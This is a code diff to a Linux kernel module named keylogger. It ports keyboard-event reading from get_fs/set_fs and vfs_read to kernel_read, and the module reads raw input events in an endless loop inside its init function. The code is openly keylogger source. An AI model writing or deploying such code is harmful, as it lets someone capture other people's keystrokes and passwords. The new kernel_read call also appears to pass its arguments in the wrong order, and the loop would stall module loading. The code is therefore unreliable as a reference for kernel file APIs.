@@ -11,16 +11,12 @@
 #define ERROR_KEYBOARD_FILE_OPEN -1
 
 struct file* file;                                                      // Used to store the file pointer
-mm_segment_t old_fs;                                                    // Used to store the current file system segment
-loff_t offset;                                                          // Used to store the current offset of the file to be read
+loff_t offset = 0;                                                          // Used to store the current offset of the file to be read
 
 static int __init keylogger_init(void) {
 
     struct input_event ie;                                              // Used to store the input event
     int ret;                                                            // Used to store the return value of kernel function for file reading
-
-    old_fs = get_fs();                                                  // Get the current file system segment
-    set_fs(KERNEL_DS);                                                  // Set the file system segment to kernel mode
 
     // Open the keyboard event file
     file = filp_open(DEVICE_NAME, O_RDONLY, 0);                         // Open the keyboard event file    
@@ -33,7 +29,7 @@ static int __init keylogger_init(void) {
 
     // Read the keyboard event file
     while (1) {
-        ret = vfs_read(file, (char*)&ie, sizeof(struct input_event), &offset);      // Read the keyboard event file
+        ret = kernel_read(file, &offset, (char*)&ie, sizeof(struct input_event));      // Read the keyboard event file
         if (ret < 0) {                                                              // If the return value is negative
 
             printk(KERN_ALERT "Couldn't read keyboard-event file!\n");              // Print error message
@@ -61,7 +57,6 @@ static int __init keylogger_init(void) {
 static void __exit keylogger_exit(void) {
     
     filp_close(file, NULL);             // Close the keyboard event file
-    set_fs(old_fs);                     // Restore the file system segment
     
 }
 
